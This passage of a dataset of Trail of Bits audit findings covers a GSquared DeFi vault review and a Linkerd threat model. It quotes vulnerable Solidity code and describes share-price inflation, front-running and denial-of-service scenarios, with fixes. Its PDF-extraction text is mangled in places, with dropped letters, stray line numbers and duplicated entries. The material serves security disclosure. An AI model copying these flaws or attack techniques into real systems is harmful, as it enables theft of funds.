system is not protable. Exploit Scenario Alice deposits $100 worth of USDC into the system. After a certain amount of time, the GSquared protocol becomes protable and Alice should be able to withdraw $110, making $10 in prot. However, due to the incorrect arithmetic performed in the getYieldTokenAmount function, Alice is able to withdraw $120 of USDC. Recommendations Short term, use convertToShares instead of convertToAssets in getYieldTokenAmount . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. convertToShares can be manipulated to block deposits ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "An attacker can block operations by using direct token transfers to manipulate convertToShares , which computes the amount of shares to deposit. convertToShares is used in the GVault code to know how many shares correspond to certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 9.1: The convertToShares function in GVault.sol This function relies on the _freeFunds function to calculate the amount of shares: 706 707 708 709 710 } /// @notice the number of total assets the GVault has excluding and profits /// and losses function _freeFunds () internal view returns ( uint256 ) { return _totalAssets() - _calculateLockedProfit(); Figure 9.2: The _freeFunds function in GVault.sol In the simplest case, _calculateLockedProfit() can be assumed as zero if there is no locked prot. The _totalAssets function is implemented as follows: 820 821 /// @notice Vault adapters total assets including loose assets and debts /// @dev note that this does not consider estimated gains/losses from the strategies 822 823 824 } function _totalAssets () private view returns ( uint256 ) { return asset.balanceOf( address ( this )) + vaultTotalDebt; Figure 9.3: The _totalAssets function in GVault.sol However, the fact that _totalAssets has a lower bound determined by asset.balanceOf(address(this)) can be exploited to manipulate the result by \"donating\" assets to the GVault address. Exploit Scenario Alice deploys a new GVault. Eve observes the deployment and quickly transfers an amount of tokens to the GVault address. One of two scenarios can happen: 1. 2. Eve transfers a minimal amount of tokens, forcing a positive amount of freeFunds . This will block any immediate calls to deposit, since it will result in zero shares to be minted. Eve transfers a large amount of tokens, forcing future deposits to be more expensive or resulting in zero shares. Every new deposit can increase the amount of free funds, making the eect more severe. It is important to note that although Alice cannot use the deposit function, she can still call mint to bypass the exploit. Recommendations Short term, use a state variable, assetBalance , to track the total balance of assets in the contract. Avoid using balanceOf , which is prone to manipulation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. Harvest operation could be blocked if eligibility check on a strategy reverts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "During harvest, if any of the strategies in the queue were to revert, it would prevent the loop from reaching the end of the queue and also block the entire harvest operation. When the harvest function is executed, a loop iterates through each of the strategies in the strategies queue, and the canHarvest() check runs on each strategy to determine if it is eligible for harvesting; if it is, the harvest logic is executed on that strategy. 312 313 314 315 316 317 318 319 320 321 322 /// @notice Execute strategy harvest function harvest () external { if ( msg.sender != keeper) revert GuardErrors.NotKeeper(); uint256 strategiesLength = strategies.length; for ( uint256 i ; i < strategiesLength; i++) { address strategy = strategies[i]; if (strategy == address ( 0 )) continue ; if (IStrategy(strategy).canHarvest()) { if (strategyCheck[strategy].active) { IStrategy(strategy).runHarvest(); try IStrategy(strategy).runHarvest() {} catch Error( ... Figure 10.1: The harvest function in GStrategyGuard.sol However, if the canHarvest() check on a particular strategy within the loop reverts, external calls from the canHarvest() function to check the status of rewards could also revert. Since the call to canHarvest() is not inside of a try block, this would prevent the loop from proceeding to the next strategy in the queue (if there is one) and would block the entire harvest operation. Additionally, within the harvest function, the runHarvest function is called twice on a strategy on each iteration of the loop. This could lead to unnecessary waste of gas and possibly undened behavior. Recommendations Short term, wrap external calls within the loop in try and catch blocks, so that reverts can be handled gracefully without blocking the entire operation. Additionally, ensure that the canHarvest function of a strategy can never revert. Long term, carefully audit operations that consume a large amount of gas, especially those in loops. Additionally, when designing logic loops that make external calls, be mindful as to whether the calls can revert, and wrap them in try and catch blocks when necessary.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "11. Incorrect rounding direction in GVault ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The minting and withdrawal operations in the GVault use rounding in favor of the user instead of the protocol, giving away a small amount of shares or assets that can accumulate over time . convertToShares is used in the GVault code to know how many shares correspond to a certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 11.1: The convertToShares function in GVault.sol This function rounds down, providing slightly fewer shares than expected for some amount of assets. Additionally, convertToAssets i s used in the GVault code to know how many assets correspond to certain amount of shares: 406 /// @notice Value of shares in underlying asset /// @param _shares amount of shares to convert to tokens function convertToAssets ( uint256 _shares ) 407 408 409 410 411 412 413 { public view override returns ( uint256 assets ) 414 uint256 _totalSupply = totalSupply; // Saves an extra SLOAD if _totalSupply is non-zero. 415 416 417 418 419 } return _totalSupply == 0 ? _shares : ((_shares * _freeFunds()) / _totalSupply); Figure 11.2: The convertToAssets function in GVault.sol This function also rounds down, providing slightly fewer assets than expected for some amount of shares. However, the mint function uses previewMint , which uses convertToAssets : 204 205 206 207 208 209 { 210 211 212 213 214 215 216 217 218 219 220 } function mint ( uint256 _shares , address _receiver ) external override nonReentrant returns ( uint256 assets ) // Check for rounding error in previewMint. if ((assets = previewMint(_shares)) == 0 ) revert Errors.ZeroAssets(); _mint(_receiver, _shares); asset.safeTransferFrom( msg.sender , address ( this ), assets); emit Deposit( msg.sender , _receiver, assets, _shares); return assets; Figure 12.3: The mint function in GVault.sol This means that the function favors the user, since they get some xed amount of shares for a rounded-down amount of assets. In a similar way, the withdraw function uses convertToShares : function withdraw ( uint256 _assets , address _receiver , address _owner 227 228 229 230 231 ) external override nonReentrant returns ( uint256 shares ) { 232 if (_assets == 0 ) revert Errors.ZeroAssets(); 233 234 235 236 shares = convertToShares(_assets); if (shares > balanceOf[_owner]) revert Errors.InsufficientShares(); 237 238 239 if ( msg.sender != _owner) { uint256 allowed = allowance[_owner][ msg.sender ]; // Saves gas for limited approvals. 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 } if (allowed != type( uint256 ).max) allowance[_owner][ msg.sender ] = allowed - shares; } _assets = beforeWithdraw(_assets, asset); _burn(_owner, shares); asset.safeTransfer(_receiver, _assets); emit Withdraw( msg.sender , _receiver, _owner, _assets, shares); return shares; Figure 11.4: The withdraw function in GVault.sol This means that the function favors the user, since they get some xed amount of assets for a rounded-down amount of shares. This issue should also be also considered when minting fees, since they should favor the protocol instead of the user or the strategy. Exploit Scenario Alice deploys a new GVault and provides some liquidity. Eve uses mints and withdrawals to slowly drain the liquidity, possibly aecting the internal bookkeeping of the GVault. Recommendations Short term, consider refactoring the GVault code to specify the rounding direction across the codebase in order keep the error in favor of the user or the protocol. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "12. Protocol migration is vulnerable to front-running and a loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The migration from Gro protocol to GSquared protocol can be front-run by manipulating the share price enough that the protocol loses a large amount of funds. The GMigration contract is responsible for initiating the migration from Gro to GSquared. The G Migration.prepareMigration function will deposit liquidity into the three-pool and then attempt to deposit the 3CRV LP token into the GVault contract in exchange for G3CRV shares (gure 12.1). Note that this migration occurs on a newly deployed GVault contract that holds no assets and has no supply of shares. 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function prepareMigration ( uint256 minAmountThreeCRV ) external onlyOwner { if (!IsGTrancheSet) { revert Errors.TrancheNotSet(); } // read senior tranche value before migration seniorTrancheDollarAmount = SeniorTranche(PWRD).totalAssets(); uint256 DAI_BALANCE = ERC20(DAI).balanceOf( address ( this )); uint256 USDC_BALANCE = ERC20(USDC).balanceOf( address ( this )); uint256 USDT_BALANCE = ERC20(USDT).balanceOf( address ( this )); // approve three pool ERC20(DAI).safeApprove(THREE_POOL, DAI_BALANCE); ERC20(USDC).safeApprove(THREE_POOL, USDC_BALANCE); ERC20(USDT).safeApprove(THREE_POOL, USDT_BALANCE); // swap for 3crv IThreePool(THREE_POOL).add_liquidity( [DAI_BALANCE, USDC_BALANCE, USDT_BALANCE], minAmountThreeCRV ); //check 3crv amount received uint256 depositAmount = ERC20(THREE_POOL_TOKEN).balanceOf( address ( this ) ); // approve 3crv for GVault ERC20(THREE_POOL_TOKEN).safeApprove( address (gVault), depositAmount); // deposit into GVault uint256 shareAmount = gVault.deposit(depositAmount, address ( this )); // approve gVaultTokens for gTranche ERC20( address (gVault)).safeApprove( address (gTranche), shareAmount); 89 90 91 92 93 94 95 96 97 98 } } Figure 12.1: The prepareMigration function in GMigration.sol#L61-98 However, this prepareMigration function call is vulnerable to a share price ination attack. As noted in this issue , the end result of the attack is that the shares (G3CRV) that the GMigration contract will receive can redeem only a portion of the assets that were originally deposited by GMigration into the GVault contract. This occurs because the rst depositor in the GVault is capable of manipulating the share price signicantly, which is compounded by the fact that the deposit function in GVault rounds in favor of the protocol due to a division in convertToShares (see TOB-GRO-11 ). Exploit Scenario Alice, a GSquared developer, calls prepareMigration to begin the process of migrating funds from Gro to GSquared. Eve notices this transaction in the public mempool, and front-runs it with a small deposit and a large token (3CRV) airdrop. This leads to a signicant change in the share price. The prepareMigration call completes, but GMigration is left with a small, insucient amount of shares because it has suered from truncation in the convertToShares function. These shares can be redeemed for only a portion of the original deposit. Recommendations Short term, perform the GSquared system deployment and protocol migration using a private relay. This will mitigate the risk of front-running the migration or price share manipulation. Long term, implement the short- and long-term recommendations outlined in TOB-GRO-11 . Additionally, implement an ERC4626Router similar to Fei protocols implementation so that a minimum-amount-out can be specied for deposit, mint, redeem, and withdraw operations. References   ERC4626RouterBase.sol ERC4626 share price ination", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "13. Incorrect slippage calculation performed during strategy investments and divestitures ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The incorrect arithmetic calculation for slippage tolerance during strategy investments and divestitures can lead to an increased rate of failed prot-and-loss (PnL) reports and withdrawals. The ConvexStrategy contract is tasked with investing excess funds into a meta pool to obtain yield and divesting those funds from the pool whenever necessary. Investments are done via the invest function, and divestitures for a given amount are done via the divest function. Both functions have the ability to manage the amount of slippage that is allowed during the deposit and withdrawal from the meta pool. For example, in the divest function, the withdrawal will go through only if the amount of 3CRV tokens that will be transferred out from the pool (by burning meta pool tokens) is greater than or equal to the _debt , the amount of 3CRV that needs to be transferred out from the pool, discounted by baseSlippage (gure 13.1). Thus, both sides of the comparison must have units of 3CRV. 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 function divest ( uint256 _debt , bool _slippage ) internal returns ( uint256 ) { uint256 meta_amount = ICurveMeta(metaPool).calc_token_amount( [ 0 , _debt], false ); if (_slippage) { uint256 ratio = curveValue(); if ( (meta_amount * PERCENTAGE_DECIMAL_FACTOR) / ratio < ((_debt * (PERCENTAGE_DECIMAL_FACTOR - baseSlippage)) / PERCENTAGE_DECIMAL_FACTOR) revert StrategyErrors.LTMinAmountExpected(); ) { } } Rewards(rewardContract).withdrawAndUnwrap(meta_amount, false ); return ICurveMeta(metaPool).remove_liquidity_one_coin( meta_amount, CRV3_INDEX, 904 905 } ); Figure 13.1: The divest function in ConvexStrategy.sol#L883-905 To calculate the value of a meta pool token (mpLP) in terms of 3CRV, the curveValue function is called (gure 13.2). The units of the return value, ratio , are 3CRV/mpLP. 1170 1171 1172 1173 1174 } function curveValue () internal view returns ( uint256 ) { uint256 three_pool_vp = ICurve3Pool(CRV_3POOL).get_virtual_price(); uint256 meta_pool_vp = ICurve3Pool(metaPool).get_virtual_price(); return (meta_pool_vp * PERCENTAGE_DECIMAL_FACTOR) / three_pool_vp; Figure 13.2: The curveValue function in ConvexStrategy.sol#L1170-1174 However, note that in gure 13.1, meta_amount value, which is the amount of mpLP tokens that need to be burned, is divided by ratio . From a unit perspective, this is multiplying an mpLP amount by a mpLP/3CRV ratio. The resultant units are not 3CRV. Instead, the arithmetic should be meta_amount multiplied by ratio. This would be mpLP times 3CRV/mpLP, which would result in the nal units of 3CRV. Assuming 3CRV/mpLP is greater than one, the division instead of multiplication will result in a smaller value, which increases the likelihood that the slippage tolerance is not met. The invest and divest functions are called during PnL reporting and withdrawals. If there is a higher risk for the functions to revert because the slippage tolerance is not met, the likelihood of failed PnL reports and withdrawals also increases. Exploit Scenario Alice wishes to withdraw some funds from the GSquared protocol. She calls GRouter.withdraw and with a reasonable minAmount . The GVault contract calls the ConvexStrategy contract to withdraw some funds to meet the necessary withdrawal amount. The strategy attempts to divest the necessary amount of funds. However, due to the incorrect slippage arithmetic, the divest function reverts and Alices withdrawal is unsuccessful. Recommendations Short term, in divest , multiply meta_amount by ratio . In invest , multiply amount by ratio . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "14. Potential division by zero in _calcTrancheValue ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Junior tranche withdrawals may fail due to an unexpected division by zero error. One of the key steps performed during junior tranche withdrawals is to identify the dollar value of the tranche tokens that will be burned by calling _calcTrancheValue (gure 14.1). function _calcTrancheValue ( bool _tranche , uint256 _amount , uint256 _total 559 560 561 562 563 ) public view returns ( uint256 ) { 564 565 566 567 568 } uint256 factor = getTrancheToken(_tranche).factor(_total); uint256 amount = (_amount * DEFAULT_FACTOR) / factor; if (amount > _total) return _total; return amount; Figure 14.1: The _calcTrancheValue function in GTranche.sol#L559-568 To calculate the dollar value, the factor function is called to identify how many tokens represent one dollar. The dollar value, amount , is then the token amount provided, _amount , divided by factor . However, an edge case in the factor function will occur if the total supply of tranche tokens (junior or senior) is non-zero while the amount of assets backing those tokens is zero. Practically, this can happen only if the system is exposed to a loss large enough that the assets backing the junior tranche tokens are completely wiped. In this edge case, the factor function returns zero (gure 14.2). The subsequent division by zero in _calcTrancheValue will cause the transaction to revert. 525 526 527 528 529 function factor ( uint256 _totalAssets ) public view override returns ( uint256 ) 530 { 531 532 533 534 535 536 537 538 539 if (totalSupplyBase() == 0 ) { return getInitialBase(); } if (_totalAssets > 0 ) { return totalSupplyBase().mul(BASE).div(_totalAssets); } // This case is totalSupply > 0 && totalAssets == 0, and only occurs on system loss 540 541 } return 0 ; Figure 14.2: The factor function in GToken.sol#L525-541 It is important to note that if the system enters a state where there are no assets backing the junior tranche, junior tranche token holders would be unable to withdraw anyway. However, this division by zero should be caught in _calcTrancheValue , and the requisite error code should be thrown. Recommendations Short term, add a check before the division to ensure that factor is greater than zero. If factor is zero, throw a custom error code specically created for this situation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Token withdrawals from GTranche are sent to the incorrect address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GTranche withdrawal function takes in a _recipient address to send the G3CRV shares to, but instead sends those shares to msg.sender (gure 15.1). 212 213 214 215 216 217 ) 218 219 220 221 { function withdraw ( uint256 _amount , uint256 _index , bool _tranche , address _recipient external override returns ( uint256 yieldTokenAmounts , uint256 calcAmount ) trancheToken.burn( msg.sender , factor, calcAmount); token.transfer( msg.sender , yieldTokenAmounts); . [...] . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 } emit LogNewWithdrawal( msg.sender , _recipient, _amount, _index, _tranche, yieldTokenAmounts, calcAmount ); return (yieldTokenAmounts, calcAmount); Figure 15.1: The withdraw function in GTranche.sol#L219-259 Since GTranche withdrawals are performed by the GRouter contract on behalf of the user, the msg.sender and _recipient address are the same. However, a direct call to GTranche.withdraw by a user could lead to unexpected consequences. Recommendations Short term, change the destination address to _recipient instead of msg.sender . Long term, increase unit test coverage to include tests directly on GTranche and associated contracts in addition to performing the unit tests through the GRouter contract.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "16. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GSquared Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions  was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the GSquared Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Lack of rate-limiting mechanisms in the identity service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The identity service issues signed certicates to sidecar proxies within Linkerd-integrated infrastructure. When proxies initialize for the rst time, they request a certicate from the identity service. However, the identity service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks. Because identity controllers are shared among pods in a cluster, a denial of service of an identity controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the identity service, the proxy can now repeatedly request a newly signed certicate as if it were a proxy sidecar initializing for the rst time. Recommendations Short term, add rate-limiting mechanisms to the identity service to prevent a single pod from requesting too many certicates or performing other computationally intensive actions. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 33 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Lack of rate-limiting mechanisms in the destination service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The destination service contains trac-routing information for sidecar proxies within Linkerd-integrated infrastructure. However, the destination service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks if a pod repeatedly changes its availability status. Because destination controllers are shared among pods in a cluster, a denial of service of a destination controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the destination service, the proxy can now repeatedly request routing information or change its availability status to force updates in the controller. Recommendations Short term, add rate-limiting mechanisms to the destination service to prevent a single pod from requesting too much routing information or performing state updates too quickly. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 34 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model 4. Exposure of admin endpoint may a\u0000ect application availability Severity: Medium Diculty: Medium Type: Awareness and Training Finding ID: TOB-LKDTM-4 Target: linkerd-proxy", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "5. Gos pprof endpoints enabled by default in all admin servers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "All core components of the Linkerd infrastructure, in both the data and control planes, have an admin server with Gos server runtime proler (pprof) endpoints on /debug/pprof enabled by default. These servers are not exposed to the rest of the cluster or to the local network by default. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers that an operator forwarded the admin server port to the local network, exposing the pprof endpoints to the local network. He connects a proler to it and gains access to debug information, which assists him in mounting further attacks. Recommendations Short term, add a check to http.go that enables pprof endpoints only when Linkerd runs in debug or test mode. Long term, audit all debug-related functionality to ensure it is not exposed when Linkerd is running in production mode. References  Your pprof is showing: IPv4 scans reveal exposed net/http/pprof endpoints 37 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Lack of access controls on the linkerd-viz dashboard ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd operators can enable a set of metrics-focused features by adding the linkerd-viz extension. Doing so enables a web UI dashboard that lists detailed information about the namespaces, services, pods, containers, and other resources in a Kubernetes cluster in which Linkerd is congured. Operators can enable Kubernetes role-based access controls to the dashboard; however, no access control options are provided by Linkerd. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers an exposed UI dashboard. By accessing the dashboard, she gains valuable insight into the cluster. She uses the knowledge gained from exploring the dashboard to formulate attacks that would expand her access to the network. Recommendations Short term, document recommendations for restructuring access to the linkerd-viz dashboard. Long term, add authentication and authorization controls for accessing the dashboard. This could be done by implementing tokens created via the CLI or client-side authorization logic. 38 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Prometheus endpoints reachable from the user application namespace ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. Metrics can include various labels with IP addresses, pod IDs, and port numbers. Threat Scenario An attacker gains access to a user application pod and calls the API directly to read Prometheus metrics. He uses the API to gain information about the cluster that aids him in expanding his access across the Kubernetes infrastructure. Recommendations Short term, disallow access to the Prometheus extension from the user application namespace. This could be done in the same manner in which access to the web dashboard is restricted from within the cluster (e.g., by allowing access only for specic hosts). 39 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Lack of egress access controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd provides access control mechanisms for ingress trac but not for egress trac. Egress controls would allow an operator to impose important restrictions, such as which external services and endpoints that a meshed application running in the application namespace can communicate with. Threat Scenario A user application becomes compromised. As a result, the application code begins making outbound requests to malicious endpoints. The lack of access controls on egress trac prevents infrastructure operators from mitigating the situation (e.g., by allowing the application to communicate with only a set of allowlisted external services). Recommendations Short term, add support for enforcing egress network policies. A GitHub issue to implement this recommendation already exists in the Linkerd repository. 40 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Prometheus endpoints are unencrypted and unauthenticated by default ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. However, this endpoint is unencrypted and unauthenticated, lacking access and condentiality controls entirely. Threat Scenario An attacker gains access to a sibling component within the same namespace in which the Prometheus endpoint exists. Due to the lack of access controls, the attacker can now laterally obtain Prometheus metrics with ease. Additionally, due to the lack of condentiality controls, such as those implemented through the use of cryptography, connections are exposed to other parties. Recommendations Short term, consider implementing access controls within Prometheus and Kubernetes to disallow access to the Prometheus metrics endpoint from any machine within the cluster that is irrelevant to Prometheus logging. Additionally, implement secure encryption of connections with the use of TLS within Prometheus or leverage existing Linkerd mTLS schemes. 41 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Shared identity and destination services in a cluster poses risks to multi-application clusters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The identity and destination controllers are meant to convey certicate and routing information for proxies, respectively. However, only one identity controller and one destination controller are deployed in a cluster, so they are shared among all application pods within a cluster. As a result, a single application pod could pollute records, causing denial-of-service attacks or otherwise compromising these cluster-wide components. Additionally, a compromise of these cluster-wide components may result in the exposure of routing information for each application pod. Although the Kubernetes API server is exposed with the same architecture, it may be benecial to minimize the attack surface area and the data that can be exltrated from compromised Linkerd components. Threat Scenario An attacker gains access to a single user application pod and begins to launch attacks against the identity and destination services. As a result, these services cannot serve other user application pods. The attacker later nds a way to compromise one of these two services, allowing her to leak sensitive application trac from other user application pods. Recommendations Short term, implement per-pod identity and destination services that are isolated from other pods. If this is not viable, consider documenting this caveat so that users are aware of the risks of hosting multiple applications within a single cluster. 42 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "11. Lack of isolation between components and their sidecar proxies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Within the Linkerd, linkerd-viz, and user application namespaces, each core component lives alongside a linkerd-proxy container, which proxies the components trac and provides mTLS for internal connections. However, because the sidecar proxies are not isolated from their corresponding components, the compromise of a component would mean the compromise of its proxy, and vice versa. This is particularly interesting when considering the lack of access controls for some components, as detailed in TOB-LKDTM-4: proxy admin endpoints are exposed to the applications they are proxying, allowing metrics collection and shutdown requests to be made. Threat Scenario An attacker exploits a vulnerability to gain access to a linkerd-proxy instance. As a result, the attacker is able to compromise the condentiality, integrity, and availability of lateral components, such as user applications, identity and destination services within the Linkerd namespace, and extensions within the linkerd-proxy namespace. Recommendations Short term, document system caveats and sensitivities so that operators are aware of them and can better defend themselves against attacks. Consider employing health checks that verify the integrity of proxies and other components to ensure that they have not been compromised. Long term, investigate ways to isolate sidecar proxies from the components they are proxying (e.g., by setting stricter access controls or leveraging isolated namespaces between proxied components and their sidecars). 43 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Lack of centralized security best practices documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model 13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance Severity: Informational Diculty: Informational Type: Awareness and Training Finding ID: TOB-LKDTM-13 Target: Linkerd", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Exposure of admin endpoint may a\u0000ect application availability ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "User application sidecar proxies expose an admin endpoint that can be used for tasks such as shutting down the proxy server and collecting metrics. This endpoint is exposed to other components within the same pod. Therefore, an internal attacker could shut down the proxy, aecting the user applications availability. Furthermore, the admin endpoint lacks access controls, and the documentation does not warn of the risks of exposing the admin endpoint over the internet. Threat Scenario An infrastructure operator integrates Linkerd into his Kubernetes cluster. After a new user application is deployed, an underlying component within the same pod is compromised. An attacker with access to the compromised component can now laterally send a request to the admin endpoint used to shut down the proxy server, resulting in a denial of service of the user application. Recommendations Short term, employ 